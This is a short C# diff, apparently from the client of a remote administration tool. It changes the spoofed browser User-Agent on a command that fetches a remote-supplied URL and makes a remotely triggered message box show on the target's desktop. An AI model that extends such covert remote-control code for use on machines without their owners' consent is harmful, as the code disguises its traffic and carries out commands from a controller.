@@ -128,7 +128,7 @@ namespace xClient.Core.Commands
                     {
                         HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                         request.UserAgent =
-                            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
+                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                         request.AllowAutoRedirect = true;
                         request.Timeout = 10000;
                         request.Method = "GET";
@@ -150,9 +150,10 @@ namespace xClient.Core.Commands
         {
             new Thread(() =>
             {
-                MessageBox.Show(null, command.Text, command.Caption,
+                MessageBox.Show(command.Text, command.Caption,
                     (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
-                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
+                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon),
+                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
             }).Start();
 
             new Packets.ClientPackets.SetStatus("Showed Messagebox").Execute(client);
